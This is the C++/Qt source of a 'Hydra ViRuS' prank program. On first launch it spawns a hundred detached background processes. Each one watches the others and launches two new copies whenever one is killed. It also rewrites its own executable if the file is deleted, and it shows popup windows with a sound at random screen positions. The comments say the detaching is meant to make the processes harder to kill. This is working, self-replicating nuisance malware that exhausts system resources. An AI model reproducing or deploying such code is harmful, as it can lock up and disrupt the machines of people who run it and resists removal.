// QT
#include <QtWidgets/QtWidgets>
#include <QtWidgets/QApplication>
#include <QtWidgets/QWidget>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QBoxLayout>
#include <QtGui/QPixmap>
#include <QtGui/QScreen>
#include <QtCore/QProcess>
#include <QtCore/QFile>
#include <QtCore/QFileDevice>
#include <QtCore/QSharedMemory>

// SFML
#include <SFML/Audio/Music.hpp>

// Standard
#include <cstdint>
#include <ctime>
#include <iostream>
//#include <iomanip>
#include <cstdlib>
#include <cstring>
#include <thread>

// Because mingw has no std::thread
#ifdef _WIN32
#include "mingw.thread.h"
#endif 

// Graphic and sound
#include "assets.h"
// os_* functions
#include "os.h"

#define WIN_WIDTH 400
#define WIN_HEIGHT 100
#define MAX_NUM_PIDS 800
#define BACKGROUND_HYDRAS 100
#define SEGMENT_SZ (MAX_NUM_PIDS*8) // Each pid is int64_t
#define MUSIC_TIME_MS_APPROX 375 

QFile exe_file;
QByteArray exe_data;
int perms;
sf::Music *music;
QSharedMemory *GLO_sharedmem;

/* Just a  QButton callback */
static void button_response() {
  QApplication::quit();
}

/* Print everything in our shared memory in hex */
/*
void print_segment_as_hex(QSharedMemory *s) {
  unsigned char *data = (unsigned char*)s->data();
  for (int i=0; i<s->size(); i++)
    for (int j=0;j<32;j++) {
      //std::cout << std::setw(2) << std::hex << (int)data[i] << ' ';
    }
    //std::cout << std::endl;
  }
  //std::cout << "---" << std::endl;
}*/

/* Goes through the shared memory segment and inserts pid to
 * the first cell that is either empty or has a dead process */
void register_pid(QSharedMemory *s, int64_t pid) {

  int64_t *shmem = (int64_t*)s->data();

  for (int i=0;i<MAX_NUM_PIDS;i++) {
    if (os_proc_is_alive(shmem[i]) == false || shmem[i] == 0) {
      shmem[i] = pid;
      return;
    }
  }
  //print_segment_as_hex(s);
}

/* Spawn and register a single hydra */
void spawn_and_register_one() {

  int64_t pid = os_exec_path(exe_file.fileName());
  //std::cout << "spawning pid " << pid << std::endl;
  register_pid(GLO_sharedmem, pid);

}

/* Spawn and register two hydras. Also, check to make sure the executable still
 * exists.  If not, rewrite it and set the correct permissions. */
void spawn_two_more() {

  if (!exe_file.exists()) {
    QFile out_stream(exe_file.fileName());
    out_stream.open(QIODevice::WriteOnly);
    out_stream.write(exe_data);
    out_stream.setPermissions((QFileDevice::Permissions)perms);
    out_stream.close();
  }

  //std::cout << "Spawning two!" << std::endl;

  spawn_and_register_one();
  spawn_and_register_one();
}

/* Continually check all PIDs stored in qsharedmem to see if they're alive. If a
 * process is found dead, respawn two hydras to take its place */
void check_hydras_loop(QSharedMemory *segment) {

  while (true) {

    segment->lock();
    int64_t *shmem = (int64_t*)segment->data();

    //print_segment_as_hex(segment);
    //std::cout << "--- " << std::endl;

    for (int i=0;i<MAX_NUM_PIDS;i++) {

      if (shmem[i] == 0) // Out of range!
	break;

      //std::cout << "pid: "<< shmem[i] << " -> " << os_proc_is_alive(shmem[i]) << std::endl;

      if (!os_proc_is_alive(shmem[i]))  {
        //std::cout << "proc at " << i << " dead?" << " (" << os_get_pid() << ")"<< std::endl;
        spawn_two_more();
        break;
      }

    }
    segment->unlock();
  }
}

/* To avoid too many instances of an open sound device, we close it
 * manually on a new thread as soon as the sound effect is over. */ 
void delete_music_after_pause() {
  os_sleep(MUSIC_TIME_MS_APPROX);
  delete music;
}


/* The index of pid in shmem, otherwise, return a really high number */
unsigned int find_in_shmem(QSharedMemory *segment, int64_t pid) {

  segment->lock();

  int64_t *shmem = (int64_t*)segment->data();

  for (int i=0;i<MAX_NUM_PIDS;i++) {

    if (shmem[i] == pid) {
      segment->unlock();
      return i;
    }

    if (shmem[i] == 0)
      break;
  }

  segment->unlock();

  return -1;

}

/* Zero out the shared memory segment */
void reset_shmem(QSharedMemory *segment) {
  segment->lock();
  memset(segment->data(), 0, SEGMENT_SZ);
  segment->unlock();
}

int main(int argc, char* argv[])  {

  exe_file.setFileName(argv[0]);

  QSharedMemory segment("hydra :)");
  GLO_sharedmem = &segment;
  bool shmem_attached = segment.attach(QSharedMemory::ReadWrite);

  // First run! Our memory segment does not exist yet!
  if (!shmem_attached) {
    //std::cout << "First hydra! Creating shared memory segment" << std::endl;
    segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
    segment.attach(QSharedMemory::ReadWrite);
    reset_shmem(&segment);

    for (int i=0;i<BACKGROUND_HYDRAS;i++) {
       segment.lock();
       spawn_and_register_one();
       segment.unlock();
    }

    // Our first GUI hydra
    segment.lock();
    spawn_and_register_one();
    segment.unlock();

    // On Windows, exiting the first process prevents creating a pr tree. All
    // hydras we just spawned should be fully detached, making them harder to kill
    exit(0);
  }

  // Less than BACKGROUND_HYDRAS have spawned so far, so enter (infinite) checking loop 
  if (find_in_shmem(&segment, os_get_pid()) < BACKGROUND_HYDRAS) {
    check_hydras_loop(&segment);
  }

  // Setup signal callbacks
  os_trap_setup();

  // Have a new thread constantly check to see if daemon is alive
  // std::thread t1(check_hydras_loop, &segment);
  // t1.detach();

  // Read in the executable file, in case they try to delete it
  exe_file.open(QIODevice::ReadOnly);
  perms = exe_file.permissions();
  exe_data = exe_file.readAll();

  // For that win93 feel
  QApplication::setStyle(QStyleFactory::create("Windows"));

  // Setup application/window
  QApplication app(argc, argv);
  QWidget window(NULL, Qt::Window);
  window.setWindowModality(Qt::ApplicationModal);
  window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);

  // Setup and play Audio
  music = new sf::Music;
  music->openFromMemory(chord_ogg, CHORD_LENGTH);
  //music->setVolume(100);
  music->play();

  // Delete this audio as soon as its done playing
  std::thread delete_music_thread(delete_music_after_pause);

  // Setup layouts
  QBoxLayout layout(QBoxLayout::TopToBottom);
  QBoxLayout row1(QBoxLayout::LeftToRight);
  QBoxLayout row2(QBoxLayout::LeftToRight);
  layout.setSpacing(0);
  row1.setSpacing(0);
  row2.setSpacing(0);

  // Create hydra icon
  QLabel image(&window);
  image.setPixmap(QPixmap(hydra_xpm));
  image.move(10,10);

  // Create message text
  QLabel text("Cut off a head, two more will take its place.\n[ Hydra ViRuS ]");
  text.setAlignment(Qt::AlignHCenter |  Qt::AlignVCenter);

  // Create the button
  QPushButton button;
  button.setFixedSize(96, 26);
  button.setDefault(true);
  button.setText("OK");

  // Put the window somewhere random on the desktop
  QRect screen = QApplication::desktop()->availableGeometry();
  std::srand(os_get_random());
  int spawn_x = std::rand()%(screen.width() - WIN_WIDTH);
  int spawn_y = std::rand()%(screen.height() - WIN_HEIGHT);
  window.setGeometry(spawn_x, spawn_y, WIN_WIDTH, WIN_HEIGHT);

  // Glue everything together
  row1.addWidget(&text, Qt::AlignLeft);
  row2.addWidget(&button, Qt::AlignHCenter);
  layout.addLayout(&row1);
  layout.addLayout(&row2);
  QObject::connect(&button, &QPushButton::clicked, button_response);

  // Start
  window.setLayout(&layout);
  window.show();
  app.exec();

  // Make sure music is closed
  delete_music_thread.join();

  return 0;
}
